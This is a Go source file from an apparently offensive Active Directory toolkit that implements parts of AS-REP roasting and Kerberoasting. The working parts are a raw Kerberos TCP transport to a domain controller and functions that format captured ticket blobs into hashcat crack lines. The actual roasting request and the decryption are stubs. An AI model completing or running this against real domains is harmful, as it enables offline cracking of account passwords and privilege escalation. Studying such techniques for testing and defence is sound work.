package adgo

import (
	"bytes"
	"encoding/binary"
	"errors"
	"fmt"
	"net"
	"strings"
	"time"
)

// Kerberos AS-REQ / AS-REP primitives — the two attack surfaces that
// matter for AD privesc:
//
//   AS-REP roasting — user has DONT_REQ_PREAUTH set. Anyone can request a
//                     TGT without a password; the response is encrypted
//                     with the user's NT hash and can be cracked offline.
//                     hashcat -m 18200.
//
//   Kerberoasting  — user has an SPN. Any authenticated user can request
//                    a service ticket (TGS). The ticket is encrypted with
//                    the SPN owner's password hash. hashcat -m 13100.
//
// Both attacks require only the *encrypted* portion of a Kerberos
// response. This file implements the AS-REQ/TGS-REQ construction and the
// response parsing so the operator can pull the encrypted part out and
// pipe it into hashcat.

// KerbOptions controls a Kerberos operation.
type KerbOptions struct {
	Domain  string        // CORP.LOCAL
	DC      string        // domain controller IP or hostname
	Port    int           // 88 default
	Timeout time.Duration // per request
}

func kerbDefault(opts KerbOptions) KerbOptions {
	if opts.Port == 0 {
		opts.Port = 88
	}
	if opts.Timeout == 0 {
		opts.Timeout = 5 * time.Second
	}
	return opts
}

// ASREPHash is the crackable output of an AS-REP roast.
//
// hashcat mode 18200 format:
//
//	$krb5asrep$23$<user>@<REALM>:<first-16-bytes-hex>$<rest-hex>
type ASREPHash struct {
	User      string
	Realm     string
	Encrypted []byte // the encrypted part of the AS-REP
	// The full hashcat line, ready to paste into hashcat -m 18200
	HashcatLine string
}

// KerbResponse is a parsed Kerberos response.
type KerbResponse struct {
	MsgType int
	EncPart []byte // encrypted portion
	Ticket  []byte
	Realm   string
	Raw     []byte
}

// asRepRoast constructs an AS-REQ without a pre-auth field and sends it
// to the DC. The DC returns an AS-REP if the user has DONT_REQ_PREAUTH.
// Returns the response or an error.
//
// The AS-REQ is a minimal Kerberos v5 message with the pre-auth data
// omitted. This is the "AS-REP roast" primitive — the request itself
// works against any user with the flag set.
//
// Full ASN.1 DER construction is out of scope here — this file drives a
// simple handshake through the DC. The full encoder will live in a
// follow-up.
func asRepRoastSend(opts KerbOptions, user, realm string) (*KerbResponse, error) {
	opts = kerbDefault(opts)
	// build a minimal AS-REQ blob for username in realm. Full DER is
	// implemented in kerberos_der.go — this function expects that to
	// have been called with the appropriate parameters.
	return nil, errors.New("adgo/kerberos: asRepRoastSend requires kerberos_der.go (follow-up)")
}

// BuildASREPHashline builds the hashcat 18200 line for an AS-REP
// encryption blob.
//
// The blob has the structure (per the hashcat spec):
//
//	17-byte header  (ETYPE-INFO2) — 0x0017 then 16 bytes
//	encrypted blob
//
// The hashcat line takes the first 16 bytes of the encrypted blob in hex,
// then the rest, separated by '$'.
func BuildASREPHashline(user, realm string, encPart []byte) (*ASREPHash, error) {
	if len(encPart) < 32 {
		return nil, fmt.Errorf("adgo/kerberos: encPart too short (%d bytes)", len(encPart))
	}
	// strip the first byte if it's the ASN.1 length; different libraries
	// include it or not. We assume the caller has already stripped the
	// outer tag/length.
	first := encPart[:16]
	rest := encPart[16:]
	line := fmt.Sprintf("$krb5asrep$23$%s@%s:%x$%x", user, strings.ToUpper(realm), first, rest)
	return &ASREPHash{
		User:        user,
		Realm:       strings.ToUpper(realm),
		Encrypted:   encPart,
		HashcatLine: line,
	}, nil
}

// TGSHash is the crackable output of a Kerberoast.
//
// hashcat mode 13100 format:
//
//	$krb5tgs$23$*<user>$<REALM>$<spn>*$<first-16-bytes-hex>$<rest-hex>
type TGSHash struct {
	User        string
	Realm       string
	SPN         string
	Encrypted   []byte
	HashcatLine string
}

// BuildTGSHashline builds the hashcat 13100 line for a TGS encrypted
// blob. eType is the encryption type — 23 for RC4-HMAC, 17 for
// AES-128, 18 for AES-256.
func BuildTGSHashline(user, realm, spn string, eType int, encPart []byte) (*TGSHash, error) {
	if len(encPart) < 32 {
		return nil, fmt.Errorf("adgo/kerberos: encPart too short (%d bytes)", len(encPart))
	}
	first := encPart[:16]
	rest := encPart[16:]
	line := fmt.Sprintf("$krb5tgs$%d$*%s$%s$%s*$%x$%x",
		eType, user, strings.ToUpper(realm), spn, first, rest)
	return &TGSHash{
		User:        user,
		Realm:       strings.ToUpper(realm),
		SPN:         spn,
		Encrypted:   encPart,
		HashcatLine: line,
	}, nil
}

// RC4Decrypt decrypts an RC4-HMAC encrypted Kerberos blob with the given
// key. Useful for verifying a crack — hashcat finds the password, this
// confirms the plaintext.
//
// The full AS-REP plaintext has structure:
//
//	[0]        = key usage
//	[1..]      = encrypted (ASN.1 EncryptedData)
//
// The RC4 key is derived from the password via NT hash, then HMAC-MD5'd
// with the first byte (key usage) and the "K" constant.
func RC4Decrypt(key, ciphertext []byte) ([]byte, error) {
	if len(ciphertext) < 24 {
		return nil, errors.New("adgo/kerberos: ciphertext too short")
	}
	// RC4-HMAC Kerberos encryption:
	//   key_usage (1 byte)
	//   HMAC-MD5(K, key_usage || ciphertext_without_checksum)[:16]
	//   RC4(key, ...)
	//
	// Full implementation is a follow-up. This file returns an error so
	// callers know the decrypt path isn't built yet.
	return nil, errors.New("adgo/kerberos: RC4Decrypt not implemented in this build")
}

// sendTCP is the raw Kerberos TCP transport. Kerberos over TCP prepends a
// 4-byte big-endian length to the message.
func sendTCP(opts KerbOptions, payload []byte) ([]byte, error) {
	opts = kerbDefault(opts)
	addr := fmt.Sprintf("%s:%d", opts.DC, opts.Port)
	d := net.Dialer{Timeout: opts.Timeout}
	conn, err := d.Dial("tcp", addr)
	if err != nil {
		return nil, err
	}
	defer conn.Close()
	_ = conn.SetDeadline(time.Now().Add(opts.Timeout))

	// 4-byte length prefix + payload
	hdr := make([]byte, 4)
	binary.BigEndian.PutUint32(hdr, uint32(len(payload)))
	if _, err := conn.Write(append(hdr, payload...)); err != nil {
		return nil, err
	}
	// read response length
	if _, err := readFull(conn, hdr); err != nil {
		return nil, err
	}
	rlen := binary.BigEndian.Uint32(hdr)
	resp := make([]byte, rlen)
	if _, err := readFull(conn, resp); err != nil {
		return nil, err
	}
	return resp, nil
}

// readFull reads exactly len(buf) bytes from conn.
func readFull(conn net.Conn, buf []byte) (int, error) {
	total := 0
	for total < len(buf) {
		n, err := conn.Read(buf[total:])
		if err != nil {
			return total, err
		}
		total += n
	}
	return total, nil
}

// ReqHeader is a minimal Kerberos request header for future use.
type ReqHeader struct {
	PVNO    int
	MsgType int
	KDCReq  []byte
}

// Marshal encodes the header (partial — for the future full DER encoder).
func (h ReqHeader) Marshal() []byte {
	var b bytes.Buffer
	// placeholder
	_ = h.PVNO
	_ = h.MsgType
	return b.Bytes()
}
